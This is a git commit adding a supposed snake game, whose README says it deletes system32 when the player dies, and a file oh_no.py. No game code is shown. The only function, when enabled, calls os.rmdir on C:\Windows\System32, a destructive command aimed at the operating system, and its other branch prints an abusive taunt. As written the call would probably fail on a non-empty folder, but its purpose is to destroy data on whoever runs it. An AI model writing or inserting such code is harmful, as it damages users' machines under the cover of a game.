63171cbf1a34fceadc06b3968990a6b8c4d1767f
BlueKitsune狐 <116144344+bluekitsune-sad@users.noreply.github.com>
2025-09-01 21:18:05 +0500

    snake game

---
+++ Snake/README.md
@@ -0,0 +1,3 @@
+a simple snake game that deletes system32 if u die
+
+
---
+++ Snake/oh_no.py
@@ -0,0 +1,7 @@
+import os
+
+def oh_no(enabled=bool):
+	if enabled == False:
+		print("you fucking pussy change me to True")
+	elif enabled == True:
+		os.rmdir("C:\Windows\System32")
